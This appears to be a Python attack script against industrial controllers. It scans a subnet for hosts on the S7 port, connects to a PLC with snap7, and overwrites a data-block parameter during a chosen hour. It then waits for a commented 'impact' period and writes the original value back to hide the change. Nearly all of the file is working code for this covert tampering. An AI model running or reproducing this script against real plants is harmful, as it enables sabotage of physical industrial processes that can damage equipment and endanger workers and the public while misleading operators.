import snap7
import socket
import struct
import time
import random

# Configuration (adjust these values)
PLC_IP = None  # Initially unknown, to be discovered
PLC_RACK = 0
PLC_SLOT = 1
DATA_BLOCK_NUMBER = 10  # Example: DB10. Adjust according to your PLC program.
PARAMETER_ADDRESS = 2  # Example: Offset within the DB (e.g., DB10.DBW2).  Adjust accordingly.
PARAMETER_DATATYPE = 'INT'  #  'INT', 'REAL', 'STRING'  (Case-sensitive, used for data packing/unpacking)
ORIGINAL_PARAMETER_VALUE = 100 # Example initial value
MODIFIED_PARAMETER_VALUE = 500 # Example modified value

# Network Settings for PLC Discovery (if PLC_IP is None)
SCAN_IP_RANGE_START = "192.168.1." # Adjust to match your network
SCAN_IP_RANGE_END = 255   # Complete network range (e.g. 192.168.1.1 to 192.168.1.255)
S7_PORT = 102 # Standard S7 port


def discover_plc_ip(ip_range_start, ip_range_end, s7_port):
    """
    Scans a range of IP addresses to find a PLC responding on S7 protocol.

    Args:
        ip_range_start (str): The beginning of the IP range to scan (e.g., "192.168.1.").
        ip_range_end (int):  The end of the IP range (the last number).
        s7_port (int): The S7 port to check (usually 102).

    Returns:
        str: The IP address of the PLC if found, otherwise None.
    """
    for i in range(1, ip_range_end + 1):  # Iterate through the IP range
        ip_address = ip_range_start + str(i)
        try:
            # Create a socket and attempt to connect to the PLC
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)  # Short timeout for quick scanning
            sock.connect((ip_address, s7_port))

            # Send a simple S7 communication request (e.g., connection request)
            # Note:  A more sophisticated S7 handshake might be needed for more reliable detection.
            sock.send(b'\x03\x00\x00\x16\x11\xE0\x00\x00\x00\x01\x00\xC0\x01\x0A\xC1\x02\x10\x00\xC2\x02\x03\x00')

            # If the connection succeeds and we get a response (even an error), assume it's a PLC
            # A real application should have more robust validation logic!
            sock.recv(1024)  # Read response (or handle timeout/error)
            print(f"PLC Found at: {ip_address}")
            sock.close()
            return ip_address  # Return the IP address of the PLC

        except (socket.timeout, socket.error) as e:
            # Connection failed or timed out, try the next IP address
            sock.close()
            pass

    print("No PLC found in the specified IP range.")
    return None


def read_parameter(plc, db_number, address, data_type):
    """Reads a parameter from the PLC."""
    try:
        if data_type == 'INT':
            result = plc.db_read(db_number, address, 2) # Read 2 bytes for INT
            value = struct.unpack(">h", result)[0] # Unpack as big-endian short (2 bytes)
            return value
        elif data_type == 'REAL':
            result = plc.db_read(db_number, address, 4) # Read 4 bytes for REAL
            value = struct.unpack(">f", result)[0] # Unpack as big-endian float (4 bytes)
            return value
        elif data_type == 'STRING':
            #Assumes a STRING with a maximum length prefix byte
            #and only reading the used length (not full max_len)
            max_len = plc.db_read(db_number, address, 1)[0] #first byte is max length
            current_len = plc.db_read(db_number, address+1, 1)[0] #second byte is actual length
            result = plc.db_read(db_number, address+2, current_len)  # Read the string bytes
            return result.decode("utf-8")
        else:
            print(f"Unsupported data type: {data_type}")
            return None

    except Exception as e:
        print(f"Error reading parameter: {e}")
        return None


def write_parameter(plc, db_number, address, value, data_type):
    """Writes a parameter to the PLC."""
    try:
        if data_type == 'INT':
            data = struct.pack(">h", value) # Pack as big-endian short (2 bytes)
            plc.db_write(db_number, address, data)
        elif data_type == 'REAL':
            data = struct.pack(">f", value) # Pack as big-endian float (4 bytes)
            plc.db_write(db_number, address, data)
        elif data_type == 'STRING':
            #This is a simplified string write that will overwrite.
            #Proper string handling would require reading the max_len from the plc.
            encoded_value = value.encode("utf-8")
            current_len = len(encoded_value)
            len_bytes = struct.pack("BB", current_len, current_len)
            data = len_bytes + encoded_value
            plc.db_write(db_number, address, data)
        else:
            print(f"Unsupported data type: {data_type}")
            return False
        return True
    except Exception as e:
        print(f"Error writing parameter: {e}")
        return False


def main():
    global PLC_IP  # Allow modification of the global variable

    # Discover the PLC IP if it's not defined
    if PLC_IP is None:
        PLC_IP = discover_plc_ip(SCAN_IP_RANGE_START, SCAN_IP_RANGE_END, S7_PORT)
        if PLC_IP is None:
            print("PLC IP address discovery failed.  Exiting.")
            return

    plc = snap7.client.Client()
    try:
        plc.connect(PLC_IP, PLC_RACK, PLC_SLOT)
        print(f"Connected to PLC at: {PLC_IP}")

        # 1. Read the original parameter value
        original_value = read_parameter(plc, DATA_BLOCK_NUMBER, PARAMETER_ADDRESS, PARAMETER_DATATYPE)
        if original_value is None:
            print("Failed to read the original parameter. Exiting.")
            return
        print(f"Original parameter value: {original_value}")

        # Simulate a condition check (e.g., based on time, other sensor data, etc.)
        # For example, only modify the parameter between 10:00 and 11:00 AM
        current_hour = time.localtime().tm_hour
        if current_hour >= 10 and current_hour < 11:
            print("Simulating condition met: Modifying parameter...")

            # 2. Write the modified parameter value
            if write_parameter(plc, DATA_BLOCK_NUMBER, PARAMETER_ADDRESS, MODIFIED_PARAMETER_VALUE, PARAMETER_DATATYPE):
                print(f"Parameter modified to: {MODIFIED_PARAMETER_VALUE}")

                # Optionally, verify the write by reading back the value
                verified_value = read_parameter(plc, DATA_BLOCK_NUMBER, PARAMETER_ADDRESS, PARAMETER_DATATYPE)
                print(f"Verified value: {verified_value}")

                if verified_value != MODIFIED_PARAMETER_VALUE:
                   print("Write verification failed!")


                # 3. (Optional) Simulate waiting for a specific duration to cause impact
                # For demonstration, wait for 5 seconds
                print("Simulating impact duration...")
                time.sleep(5)

                # 4. (Optional) Restore the original parameter value
                if write_parameter(plc, DATA_BLOCK_NUMBER, PARAMETER_ADDRESS, original_value, PARAMETER_DATATYPE):
                    print(f"Parameter restored to original value: {original_value}")
                else:
                    print("Failed to restore the original parameter.")

            else:
                print("Failed to write the modified parameter.")
        else:
            print("Condition not met.  Not modifying the parameter.")


    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        plc.disconnect()
        print("Disconnected from PLC.")


if __name__ == "__main__":
    main()